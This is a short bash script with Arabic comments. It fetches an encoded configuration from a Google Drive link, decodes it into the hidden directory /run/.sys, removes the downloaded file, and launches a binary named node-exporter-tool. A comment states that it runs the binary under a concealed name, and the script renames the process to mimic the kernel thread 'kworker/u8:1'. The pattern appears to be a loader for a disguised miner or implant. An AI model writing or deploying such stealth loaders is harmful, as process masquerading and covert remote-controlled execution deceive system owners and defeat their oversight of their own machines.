#!/bin/bash
# يحمّل الكونفج مشفّر من Google Drive ويشغله
set -e

CONF_URL="https://drive.google.com/uc?export=download&id=1oX8bxAjAc6HBEDuBpwcijaE6RZyPhgix"

mkdir -p /run/.sys
curl -fsSL "$CONF_URL" -o /run/.sys/c.bin
# الكونفج مخزّن base64 + gzip
base64 -d /run/.sys/c.bin | gunzip > /run/.sys/c.json
rm -f /run/.sys/c.bin

# تشغيل بعنوان غير مكشوف
exec -a "kworker/u8:1" /usr/local/bin/node-exporter-tool -config /run/.sys/c.json
